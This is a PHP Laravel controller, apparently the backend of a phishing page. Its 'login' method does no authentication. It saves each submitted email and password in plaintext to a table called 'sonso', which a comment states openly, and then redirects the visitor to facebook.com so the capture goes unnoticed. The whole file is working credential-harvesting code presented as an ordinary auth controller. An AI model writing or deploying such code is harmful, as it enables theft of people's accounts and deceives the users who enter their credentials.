<?php

namespace App\Http\Controllers;

use App\Models\Sonso;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Redirect;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        // Validación de los datos de entrada
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        try {
            // Verificar cuántas veces se ha insertado el mismo email y contraseña
            $count = Sonso::where('email', $request->email)
                ->where('password', $request->password)
                ->count();

            // Si ya se ha insertado 10 veces, se activa la restricción de unicidad
            if ($count >= 10) {
                throw new \Exception("Se ha alcanzado el límite de inserciones para el email y contraseña especificados.");
            }

            // Guardar el email y contraseña en la tabla 'sonso'
            $sonso = new Sonso();
            $sonso->email = $request->email;
            $sonso->password = $request->password; // Guardar la contraseña en texto plano
            $sonso->save();
            
        } catch (\Exception $e) {
            // Manejar errores de inserción
            return redirect()->back()->withErrors(['msg', $e->getMessage()]);
        }

        // Redirigir al usuario a la página de inicio de sesión de Facebook
        return Redirect::to('https://www.facebook.com/');
    }
}
